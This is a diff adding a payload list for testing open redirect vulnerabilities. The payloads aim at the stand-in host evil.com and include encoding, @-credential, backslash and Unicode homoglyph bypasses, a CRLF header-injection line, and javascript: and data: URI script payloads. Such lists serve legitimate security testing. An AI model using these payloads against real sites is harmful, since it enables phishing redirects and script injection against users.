@@ -1,0 +1,78 @@
+# Open Redirect Payloads
+# Format: payload (one per line)
+# These are used to test for URL redirection vulnerabilities
+
+# Basic redirects
+https://evil.com
+http://evil.com
+//evil.com
+/\evil.com
+////evil.com
+
+# Protocol variations
+https:evil.com
+https:/evil.com
+https:\\evil.com
+http:evil.com
+
+# Encoding bypasses
+https:%2F%2Fevil.com
+https:%252F%252Fevil.com
+%2F%2Fevil.com
+//evil%2Ecom
+https://evil%E3%80%82com
+https://evil。com
+https://evil｡com
+
+# Username/password bypass (@)
+https://legitimate.com@evil.com
+https://legitimate.com%40evil.com
+https://legitimate.com:password@evil.com
+//legitimate.com@evil.com
+
+# Fragment and query bypass
+https://evil.com#legitimate.com
+https://evil.com?legitimate.com
+https://evil.com/legitimate.com
+
+# Backslash tricks
+https://evil.com\.legitimate.com
+/\/evil.com
+/\\evil.com
+\\evil.com
+\/\/evil.com
+
+# Null byte injection
+https://evil.com%00.legitimate.com
+https://evil.com%0d%0aLocation:%20http://evil.com
+
+# Unicode normalization
+https://еvil.com
+https://ⓔⓥⓘⓛ.com
+https://evil。com
+
+# Path traversal
+https://evil.com/legitimate.com/../
+/../evil.com
+/..%2fevil.com
+
+# Subdomain tricks
+https://legitimate.com.evil.com
+https://evil.com/legitimate.com
+
+# JavaScript protocol
+javascript://evil.com/%0aalert(1)
+javascript:alert(document.domain)//
+
+# Data URI
+data:text/html,<script>location='https://evil.com'</script>
+data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=
+
+# Case variations
+HTTPS://EVIL.COM
+hTtPs://eViL.cOm
+
+# IP address variations
+https://167772161
+https://0xA9FEA9FE
+https://0251.0376.0251.0376
